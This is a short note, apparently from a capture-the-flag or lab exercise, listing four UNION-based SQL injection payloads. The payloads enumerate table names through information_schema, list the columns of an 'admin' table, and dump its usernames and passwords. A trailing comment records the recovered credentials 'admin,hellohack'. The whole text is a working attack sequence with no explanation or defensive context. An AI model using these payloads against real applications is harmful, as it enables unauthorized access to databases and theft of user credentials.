union select 1,table_name from information_schema.tables where table_schema=database() limit 0,2
union select 1,column_name from information_schema.columns where table_name='admin' limit 0,2
union select 1,username from admin
union select 1,password from admin  //admin,hellohack